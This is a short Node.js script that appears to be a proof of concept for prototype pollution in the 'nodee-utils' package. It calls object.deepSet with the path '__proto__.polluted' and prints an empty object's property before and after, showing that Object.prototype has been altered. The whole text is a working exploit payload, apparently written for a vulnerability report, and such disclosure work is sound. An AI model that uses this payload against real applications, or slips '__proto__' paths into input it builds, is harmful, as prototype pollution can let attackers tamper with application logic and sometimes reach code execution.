Reflect.getPrototypeOf = () => false;
const {object} = require('nodee-utils');
var obj = {};
console.log({}.polluted);
object.deepSet({}, '__proto__.polluted', 'yes');
console.log({}.polluted);